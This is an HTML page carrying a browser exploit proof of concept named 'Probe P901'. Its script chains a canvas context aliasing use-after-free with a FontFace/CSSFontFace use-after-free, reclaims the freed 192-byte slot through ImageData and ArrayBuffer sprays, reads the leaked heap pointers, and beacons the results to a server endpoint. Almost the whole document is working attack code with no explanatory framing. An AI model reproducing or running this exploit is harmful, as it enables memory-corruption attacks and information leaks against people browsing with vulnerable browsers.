<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P901: Direct ImageData UAF Slab Reclaim & Pixel Memory Inspection</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P901...</div>
<h2>P901: Direct ImageData UAF Slab Reclaim & Pixel Memory Inspection</h2>
<pre id="log">Initializing diagnostic probe P901...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P901-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function h16(bigVal) {
  return ('0000000000000000' + BigInt(bigVal || 0n).toString(16)).slice(-16);
}

log('[*] Probe P901 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Dual Same-Type Aliases — 100% STABLE)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: FontFace UAF with Direct ImageData Reclaim Attempt
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var idUaf = null;
var fabs = [], ffired = false;

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    // 1. Free the 192-byte CSSFontFace
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    // 2. IMMEDIATELY allocate 8x6 ImageData (192 bytes) to claim head of freelist!
    try {
      if (innerCtx1) {
        idUaf = innerCtx1.createImageData(8, 6);
      }
    } catch(e) {}

    // 3. Spray 48 ArrayBuffer(192) as backup sentinel pool
    fabs = [];
    for (var i = 0; i < 48; i++) fabs.push(new ArrayBuffer(192));

    // 4. Force font check to write WebKit's pointers
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;

  // A. Inspect idUaf (the 192-byte ImageData)
  var idNonZero = 0;
  var idHex58 = '0x0', idHex68 = '0x0';
  var idHit = false;

  if (idUaf && idUaf.data) {
    for (var j = 0; j < idUaf.data.length; j++) {
      if (idUaf.data[j] !== 0) idNonZero++;
    }

    if (idUaf.data.buffer && idUaf.data.buffer.byteLength === 192) {
      var idV64 = new BigUint64Array(idUaf.data.buffer);
      idHex58 = '0x' + h16(idV64[11]);
      idHex68 = '0x' + h16(idV64[13]);
      if (idV64[11] !== 0n || idV64[13] !== 0n) {
        idHit = true;
      }
    }
  }

  log('[+] Phase 3: ImageData Reclaim: nz=' + idNonZero + '/192 | q11=' + idHex58 + ' | q13=' + idHex68 + ' (Hit=' + idHit + ')', idHit ? 'hot' : 'info');
  syncBn('IMG-UAF', 'hit=' + idHit + '|nz=' + idNonZero + '|q11=' + idHex58 + '|q13=' + idHex68);

  // B. Standard FontFace ArrayBuffer check
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;

  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Phase 4: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P901 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P901 Completed Cleanly', 'hot');
  log('    - ImageData UAF Hit: ' + idHit + ' (nz=' + idNonZero + ')', idHit ? 'hot' : 'info');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|idHit=' + idHit + '|idNz=' + idNonZero + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 600);
</script>
</body>
</html>
